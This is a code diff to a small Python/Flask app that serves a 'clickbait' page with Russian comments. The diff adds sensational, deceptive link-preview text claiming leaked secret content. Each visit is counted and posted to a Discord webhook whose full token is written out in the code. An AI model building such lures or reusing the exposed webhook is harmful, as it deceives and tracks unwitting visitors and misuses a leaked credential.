@@ -4,7 +4,9 @@ import requests
 app = Flask(__name__)
 
 # Настройки
-CLICKBAIT_TITLE = "Сосский хомяк SosmarkCombat ВЫШЕЛ!"
+CLICKBAIT_TITLE = "😱 ШОК! Ты не поверишь, что здесь скрыто..."
+CLICKBAIT_DESCRIPTION = "🔥 Эксклюзив! Это должно было остаться в секрете, но утекло в сеть. Скорее смотри, пока не удалили!"
+CLICKBAIT_IMAGE = "https://lastfm.freetls.fastly.net/i/u/ar0/c053578dee276b51d053b51c6b855dc7.png"  # Заменить на реальную картинку
 REAL_URL = "https://youtu.be/kk3_5AHEZxE?si=7IPBytfu0W27ML1_"  # Настоящая ссылка
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1338142323795824691/ox3HgetuOjqcKx-3AO1X6mb53Y-SfS8MBt3XU2M8GLVcgfNPE85Gk2Y8e5TDVYdsKUwt"  # Вставь свой Webhook
 
@@ -17,9 +19,9 @@ def home():
 
 @app.route('/generate')
 def generate_link():
-    return "Вот ваша кликбейт-ссылка: http://127.0.0.1:5000/clickbait"
+    return "Вот ваша кликбейт-ссылка: http://127.0.0.1:5000/Sosishcombat"
 
-@app.route('/clickbait')
+@app.route('/Sosishcombat')
 def clickbait_page():
     global click_count
     click_count += 1
@@ -34,11 +36,25 @@ def clickbait_page():
     }
     requests.post(DISCORD_WEBHOOK_URL, json=payload)
 
-    # HTML-страница с анимацией
+    # HTML-страница с OG-тегами
     html_content = f"""
     <html>
     <head>
         <title>{CLICKBAIT_TITLE}</title>
+
+        <!-- Open Graph (OG) Meta Tags -->
+        <meta property="og:title" content="{CLICKBAIT_TITLE}">
+        <meta property="og:description" content="{CLICKBAIT_DESCRIPTION}">
+        <meta property="og:image" content="{CLICKBAIT_IMAGE}">
+        <meta property="og:url" content="http://127.0.0.1:5000/clickbait">
+        <meta property="og:type" content="website">
+
+        <!-- Twitter Cards -->
+        <meta name="twitter:card" content="summary_large_image">
+        <meta name="twitter:title" content="{CLICKBAIT_TITLE}">
+        <meta name="twitter:description" content="{CLICKBAIT_DESCRIPTION}">
+        <meta name="twitter:image" content="{CLICKBAIT_IMAGE}">
+
         <style>
             body {{
                 font-family: Arial, sans-serif;
